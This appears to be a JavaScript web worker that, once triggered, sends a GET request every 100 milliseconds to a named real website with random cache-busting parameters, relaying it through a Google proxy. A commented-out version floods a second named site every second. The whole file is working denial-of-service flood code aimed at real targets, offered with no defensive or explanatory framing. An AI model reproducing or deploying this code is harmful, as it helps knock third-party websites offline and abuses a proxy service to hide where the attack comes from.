self.addEventListener('message', function(e) {

	setInterval(function(){

		var target = 'http://www.soruyacevap.com/?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);

		var url = 'https://images1-focus-opensocial.googleusercontent.com/gadgets/proxy?url='+encodeURIComponent(target)+'&container=none';

		var xmlHttp = new XMLHttpRequest();

		xmlHttp.open("GET", url, true);

		xmlHttp.send(null);

	}, 100);

});


/*
self.addEventListener('message', function(e) {
	
	setInterval(function(){
		
		var url = 'http://smokturkey.org/?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
	
		var xmlHttp = new XMLHttpRequest();
		
		xmlHttp.open("GET", url, true);
		
		xmlHttp.send(null);					
		
	}, 1000);

});
*/
